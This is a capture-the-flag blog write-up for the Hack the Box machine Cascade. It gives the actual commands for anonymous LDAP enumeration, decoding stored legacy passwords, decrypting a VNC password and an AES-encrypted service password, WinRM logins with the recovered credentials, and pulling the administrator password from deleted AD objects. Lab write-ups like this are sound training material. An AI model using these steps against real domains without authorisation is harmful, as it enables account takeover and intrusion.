+++
author = "Nick"
categories = ["hack the box", "medium", "cascade", "evil-WinRAR", "windows", "ldap", "reverse engineering", "aes", "dotpeek", "ida", "vnc decrypt"]
date = 2020-07-25T14:59:00Z
description = ""
draft = false
image = "__GHOST_URL__/content/images/2020/04/cascadeinfo.png"
slug = "hack-the-box-cascade"
summary = "Welcome back! Today we are doing the Hack the Box machine - Cascade! This machine is listed as an easy Windows system. Let's jump in!"
tags = ["hack the box", "medium", "cascade", "evil-WinRAR", "windows", "ldap", "reverse engineering", "aes", "dotpeek", "ida", "vnc decrypt"]
title = "Hack the Box - Cascade"

+++


Welcome back! Today we are doing the Hack the Box machine - Cascade! This machine is listed as an easy Windows system. Let's jump in!

As normal, we kick it off with `nmap`: `nmap -sC -sV -p- -oA allscan 10.10.10.182`

Here are our results:
```
Not shown: 65520 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-02 12:57:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2m29s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-04-02T12:58:43
|_  start_date: 2020-04-02T09:52:45

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 414.85 seconds
```

We see quite a few ports. It looks like we want to obtain a foothold via `ldap` and leveraging it via `WinRPC`. We'll run it through a quick `enum4linux` to see what low hanging fruit might be there:

Command:
`enum4linux -a 10.10.10.182`

This gives us a bunch of errors, as usual for the tool. It does give us some user data though:

```
Group 'Domain Users' (RID: 513) has member: CASCADE\administrator
Group 'Domain Users' (RID: 513) has member: CASCADE\krbtgt
Group 'Domain Users' (RID: 513) has member: CASCADE\arksvc
Group 'Domain Users' (RID: 513) has member: CASCADE\s.smith
Group 'Domain Users' (RID: 513) has member: CASCADE\r.thompson
Group 'Domain Users' (RID: 513) has member: CASCADE\util
Group 'Domain Users' (RID: 513) has member: CASCADE\j.wakefield
Group 'Domain Users' (RID: 513) has member: CASCADE\s.hickson
Group 'Domain Users' (RID: 513) has member: CASCADE\j.goodhand
Group 'Domain Users' (RID: 513) has member: CASCADE\a.turnbull
Group 'Domain Users' (RID: 513) has member: CASCADE\e.crowe
Group 'Domain Users' (RID: 513) has member: CASCADE\b.hanson
Group 'Domain Users' (RID: 513) has member: CASCADE\d.burman
Group 'Domain Users' (RID: 513) has member: CASCADE\BackupSvc
Group 'Domain Users' (RID: 513) has member: CASCADE\j.allen
Group 'Domain Users' (RID: 513) has member: CASCADE\i.croft
```

We have some user accounts, but we want to verify that the domain is what we might assume, maybe cascade.local or cascade.htb. We can do this with `ldapsearch`. Normally, you would probably just jump right into `ldapsearch` and skip `enum4linux`. For me, that's what my workflow looks like, out of habit. 

We want to get our directory partitions for the domain so that we fully understand our search scope. Here's a quick command to obtain that:

Command:
`ldapsearch -h 10.10.10.182 -x -s namingcontexts`

This queries the target with simple authentication (`-x`). Searching the scope (`-s`) of namingcontexts. You can take a quick look here for more info: https://ldapwiki.com/wiki/NamingContext

![](/images/2020/04/image.png)

We do see the base of cascade.local. We'll re-issue the `ldapsearch` with the base specified and obtain a pretty large list of data.

Command:
`ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" > ldapoutput'

This runs an anonymous query an obtains as much information as it can. We save this file so we can manipulate it as well.

We can now start to grep through the file and obtain more information. One item I like to check against is `badPwdCount`. This can often give us an idea of active user accounts (assuming someone isn't spraying the box). We simply grep the output file for pwd.

Command:
`cat ldapoutput | grep -i pwd`

When we do this we do see the box is probably getting spray, but we also find an interesting object - `cascadeLegacyPwd`.

![](/images/2020/04/image-1.png)

Looks like we have a base64 password here. Let's quickly decrypt it.

Command:
`echo clk0bjVldmE= | base64 -d`

![](/images/2020/04/image-2.png)

We get back our password! Now the question is, what accounts does it work on? We can search the file for the hashed password to hopefully associate an account.

Command:
`cat ldapout | grep -n10 'clk0bjVldmE='`

This will give us 10 lines before and after the keyword found. We see that the password belongs to r.thompson.

![](/images/2020/04/image-3.png)

Now that we have a password, we will try it out with `evil-winRM`.

Command:
`evil-winrm -i 10.10.10.182 -u r.thompson -p rY4n5eva`

We get access denied. We can try it against SMB share as well. Frist we'll try to enumerate the shares available with the `-L` function of `smbclient`.

Command:
`smbclient -L //10.10.10.182 -U r.thompson`

![](/images/2020/04/image-4.png)

The share that's most appealing is `Audit$` and `Data`. We'll try to connect to both and see what's inside. The Audit share has listing access denied but the Data share does not.

![](/images/2020/04/image-5.png)

We are only able to list the contents of the IT directory. As we sift through the directories we are able to download some files:
```
ArkAdRecycleBin.log
dcdiag.log
Meeting_Notes_June_2018.html
VNC Install.reg
```
When we look at these files we see a TempAdmin account which is also referenced in the email notes file. Also in the VLC Reg file we see a hex password. Trying to decode the Hex format doesn't give us anything. Some googling around finds us a VNC password decoder. [This](http://ashbrook.io/2018-01-29-Decrypting-VNC-Passwords/) is the post I used in particular. Original file hosted [here](https://aluigi.altervista.org/pwdrec.htm) on his personal site.

We download referenced application and feed it our hex.

![](/images/2020/04/image-6.png)

We now have another password - `sT333ve2`. What are the chances that this password is for the TempAdmin account? No such luck. We did find this file in s.smith's directory, so there is a good chance this could be that users password. We try it with `Evil-WinRM` first and it works!

![](/images/2020/04/user-cascade-1.gif)

We head over and snag the flag. Now that we have a user account with WinRM capabilities. We'll start enumerating internally. We start by checking what groups we belong to. We see that this account has access to the previously inaccessible audit share.

![](/images/2020/04/image-7.png)

So we'll attempt to connect as this user to the share.

Command:
`mbclient //10.10.10.182/Audit$ -U s.smith`

Once we're in we see quire a few files. The first is this `RunAudit.bat` file as well as CascAudit.exe. We also have a file called `Audit.db`. We'll download all of the files to look at them locally.

We see that `RunAudit.bat` file is simply calling the previous executables and referencing a database location / file.

![](/images/2020/04/image-8.png)

So we want to see what's inside this file. In the past I've used https://inloop.github.io/sqlite-viewer/ to view these files. We'll upload it here again and see what it contains. We see there are 4 tables.

![](/images/2020/04/image-9.png)

As we go through the content, we see the password for the service account `ArkSvc`!

![](/images/2020/04/image-10.png)

Great, we now have an encrypted password. We also know that we obtained a `CascCrypto.dll` file from the server as well. Looks like we might have to crack open the DLL to see how the encryption works. For modern applications, I tend to use [dotPeek by JetBrains](https://www.jetbrains.com/decompiler/) in conjunction with [dnSpy](https://github.com/0xd4d/dnSpy/releases). 

Once we open the file we get a great look at the main module.

```
// Decompiled with JetBrains decompiler
// Type: CascAudiot.MainModule
// Assembly: CascAudit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A5ED61EF-EE06-4B4D-B028-DFA5DECD972B
// Assembly location: C:\Users\ncani\Documents\HTB\CascCrypto.dll

using CascAudiot.My;
using CascCrypto;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Data.SQLite;
using System.DirectoryServices;

namespace CascAudiot
{
  [StandardModule]
  internal sealed class MainModule
  {
    private const int USER_DISABLED = 2;

    [STAThread]
    public static void Main()
    {
      if (MyProject.Application.CommandLineArgs.Count != 1)
      {
        Console.WriteLine("Invalid number of command line args specified. Must specify database path only");
      }
      else
      {
        using (SQLiteConnection sqLiteConnection = new SQLiteConnection("Data Source=" + MyProject.Application.CommandLineArgs[0] + ";Version=3;"))
        {
          string empty1 = string.Empty;
          string str1 = string.Empty;
          string empty2 = string.Empty;
          try
          {
            sqLiteConnection.Open();
            using (SQLiteCommand sqLiteCommand = new SQLiteCommand("SELECT * FROM LDAP", sqLiteConnection))
            {
              using (SQLiteDataReader sqLiteDataReader = sqLiteCommand.ExecuteReader())
              {
                sqLiteDataReader.Read();
                empty1 = Conversions.ToString(sqLiteDataReader.get_Item("Uname"));
                empty2 = Conversions.ToString(sqLiteDataReader.get_Item("Domain"));
                string str2 = Conversions.ToString(sqLiteDataReader.get_Item("Pwd"));
                try
                {
                  str1 = Crypto.DecryptString(str2, "c4scadek3y654321");
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  Console.WriteLine("Error decrypting password: " + ex.Message);
                  ProjectData.ClearProjectError();
                  return;
                }
              }
            }
            sqLiteConnection.Close();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            Console.WriteLine("Error getting LDAP connection data From database: " + ex.Message);
            ProjectData.ClearProjectError();
            return;
          }
          int num = 0;
          using (DirectoryEntry searchRoot = new DirectoryEntry())
          {
            searchRoot.Username = empty2 + "\\" + empty1;
            searchRoot.Password = str1;
            searchRoot.AuthenticationType = AuthenticationTypes.Secure;
            using (DirectorySearcher directorySearcher = new DirectorySearcher(searchRoot))
            {
              directorySearcher.Tombstone = true;
              directorySearcher.PageSize = 1000;
              directorySearcher.Filter = "(&(isDeleted=TRUE)(objectclass=user))";
              directorySearcher.PropertiesToLoad.AddRange(new string[3]
              {
                "cn",
                "sAMAccountName",
                "distinguishedName"
              });
              using (SearchResultCollection all = directorySearcher.FindAll())
              {
                Console.WriteLine("Found " + Conversions.ToString(all.Count) + " results from LDAP query");
                sqLiteConnection.Open();
                try
                {
                  IEnumerator enumerator;
                  try
                  {
                    enumerator = all.GetEnumerator();
                    while (enumerator.MoveNext())
                    {
                      SearchResult current = (SearchResult) enumerator.Current;
                      string empty3 = string.Empty;
                      string empty4 = string.Empty;
                      string empty5 = string.Empty;
                      if (current.Properties.Contains("cn"))
                        empty3 = Conversions.ToString(current.Properties["cn"][0]);
                      if (current.Properties.Contains("sAMAccountName"))
                        empty4 = Conversions.ToString(current.Properties["sAMAccountName"][0]);
                      if (current.Properties.Contains("distinguishedName"))
                        empty5 = Conversions.ToString(current.Properties["distinguishedName"][0]);
                      using (SQLiteCommand sqLiteCommand = new SQLiteCommand("INSERT INTO DeletedUserAudit (Name,Username,DistinguishedName) VALUES (@Name,@Username,@Dn)", sqLiteConnection))
                      {
                        sqLiteCommand.get_Parameters().AddWithValue("@Name", (object) empty3);
                        sqLiteCommand.get_Parameters().AddWithValue("@Username", (object) empty4);
                        sqLiteCommand.get_Parameters().AddWithValue("@Dn", (object) empty5);
                        checked { num += sqLiteCommand.ExecuteNonQuery(); }
                      }
                    }
                  }
                  finally
                  {
                    if (enumerator is IDisposable)
                      (enumerator as IDisposable).Dispose();
                  }
                }
                finally
                {
                  sqLiteConnection.Close();
                  Console.WriteLine("Successfully inserted " + Conversions.ToString(num) + " row(s) into database");
                }
              }
            }
          }
        }
      }
    }
  }
}
```

![](/images/2020/04/image-11.png)

This in particular is good for us. We have the Secret Key for the encryption but what we also need is the IV. We load the items into IDA and link the DLL. We get a IV of `1tdyjCbY1lx49842`. We can now decrypt the AES [here](https://www.devglan.com/online-tools/aes-encryption-decryption).

The decrypted password is `w3lc0meFr31nd`!

![](/images/2020/04/image-12.png)

Now we have the service account password, we can reconnect as that account.

Command:
`Evil-WinRM -i 10.10.10.182 -U ArkSvc -p w3lc0meFr31nd`

![](/images/2020/04/image-13.png)

Once we're in, we start to enumerate more as this service account. We know the service account has the ability delete accounts based on what we saw in the logs. We should start by trying to identify previously deleted accounts. The email said that the TempAdmin account had the same password as the standard admin account. So if the TempAdmin account is indeed still in the recyle bin we might be able to obtain data from it.

For this, we use PowerShell, something everyone should be familiar with at some level. We'll use the `Get-AdObject` cmdlet with some filters.

Command:
`Evil-WinRM> Get-ADObject -filter 'isdeleted -eq $true' -includedeletedobjects`

![](/images/2020/04/image-14.png)

This gives us a list of deleted users but nothing else, we need to appened `-property *` to the end of our command.

Command
`Evil-WinRM> Get-ADObject -filter 'isdeleted -eq $true' -includedeletedobjects -property *`

![](/images/2020/04/image-15.png)

As you can see, this gives us a huge list of properties on each of the accounts. Just like before we had a AD Attribute of `cascadeLegacyPwd`.

![](/images/2020/04/image-16.png)

We can now decode this password and use it to log in as Administrator!

![](/images/2020/04/image-17.png)

We now have a password - `baCT3r1aN00dles`. Let's try to log in as Administrator.

![](/images/2020/04/image-18.png)

We are in! We snag the root.txt file! Box complete!

Think about sending me some respect over on HTB if you enjoyed the write-up! Here's my [profile](https://www.hackthebox.eu/home/users/profile/95635).



